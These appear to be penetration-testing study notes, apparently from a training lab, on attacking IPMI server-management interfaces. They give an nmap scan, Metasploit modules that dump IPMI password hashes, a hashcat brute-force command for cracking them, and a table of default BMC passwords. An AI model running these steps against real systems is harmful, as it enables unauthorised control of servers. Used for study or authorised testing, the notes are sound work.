
## Enumeration 

```sh
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

msf6 > use auxiliary/scanner/ipmi/ipmi_version 
### impi scanner

msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
### ipmi hash dump

hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
### tries all combo of upper case lettrs and no.s
```

---

## Default Passwords

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|

---